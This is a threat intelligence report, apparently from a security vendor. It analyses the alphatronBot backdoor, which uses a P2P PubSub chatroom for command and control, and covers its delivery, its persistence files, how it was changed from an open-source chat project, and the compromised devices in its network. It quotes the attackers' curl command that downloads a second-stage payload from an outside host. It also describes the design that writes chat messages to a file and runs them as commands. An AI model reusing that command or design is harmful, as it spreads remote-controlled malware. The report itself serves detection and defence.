Overview
The QiAnXin Threat Intelligence Center recently discovered a P2P-based backdoor that uses PubSub chatroom mechanisms for command and control. This backdoor, named alphatronBot, is embedded with over 700 infected P2P C2 nodes and affects both Linux and Windows platforms. Numerous government and enterprise networks in China have been compromised.

AlphatronBot possesses remote control capabilities and supports payload delivery. Tracing efforts reveal that alphatronBot first appeared in early 2023, with a major refactor occurring in April 2024. Infected P2P nodes have recently been observed participating in brute-force attacks as proxy relays.

It is recommended that government and enterprise users deploy Tianqing EDR across both office and server networks. The latest virus definitions now support detection and removal of both legacy and updated versions of alphatronBot.

Infection Method – alphatronBot (2024 Variant)
The 2024 version of alphatronBot is commonly deployed as a second-stage payload using curl for remote fetching. It is suspected to be part of a MAAS (Malware-as-a-Service) distribution system, leveraging general vulnerabilities for propagation.

Sample Command:
curl -k -o "***AppData\Local\Temp\NetFramework.4.8.7z" -L -C - "https://z.yaridata.com/v/NetFramework.4.8.7z" --user-agent "****" --retry 3
A file named Wtime.cmd is added for persistence, which launches a loader named wuf.exe.

wuf.exe then starts the alphatronBot backdoor under the name Windows Driver Foundation (WDF).exe.

Technical Details
The refactored alphatronBot (2024) is derived from the open-source project manishmeganathan/peerchat, which uses libp2p to implement a decentralized chat system. The attackers made the following modifications:

At startup, the malware checks if it resides in C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\ and whether r01.txt exists.

It registers itself as a P2P node, storing configuration data in zk.txt and zi.txt.

Contains over 700 preconfigured P2P nodes with the following format:
/ip4/[infected_node]/tcp/48888/p2p/[Peer ID]
Communication uses PubSub and joins a common Topic (roomname).

The topic prefix is modified to at001, and the roomname has been replaced.

Upon joining, the bot sets its username as Alpha.

The default UI behavior (printing chat messages) is replaced:

display.chatmessage is modified to write received messages into zc01.cmd.

Executes the file using cmd, enabling remote command execution.

Threat Attribution and Evolution
Analysis based on endpoint data uncovered a 2023 variant of alphatronBot (MD5: d038f50779fc1ae97db5b40289a38d64), written in Qt with similar capabilities. VT upload data indicates that alphatronBot infections span globally.

Once connected to the P2P network, it executes the following reconnaissance commands:

Example Commands:
tasklist
WMIC DISKDRIVE GET SERIALNUMBER
This allows attackers to identify victims by their Peer ID and issue customized payloads.

Impact Scope
Infected P2P Network
The 700+ embedded P2P nodes span 80 countries and regions, composed of compromised:

MikroTik routers

Hikvision cameras

VPS servers

DLink routers

CPE devices

Since alphatronBot converts each infected device into a P2P node, the actual network size is presumed to be significantly larger. QiAnXin’s Global Botnet Detection System observed some of these IPs being used as proxies to brute-force Fortinet SSVPN endpoints.

Impact Within China
Data shows that the attack campaign has persisted since mid-2023. A wide range of sectors have been affected.

Due to the stealth nature of P2P, attackers can issue commands through any node without relying on a central C2 server. This also means partial takedowns are ineffective. The backdoor supports distributed updates, allowing the injection of new modules or patches, enhancing its resilience and longevity.

It is advised that affected organizations update their virus databases, conduct full system scans, and use network-level indicators provided by QiAnXin to search for infected nodes.

Conclusion
QiAnXin's entire product suite, including:

Threat Intelligence Platform (TIP)

Tianqing EDR

Tianyan APT Detection System

NGSOC

Situational Awareness Platform

has been updated to accurately detect and respond to threats posed by alphatronBot and its variants.
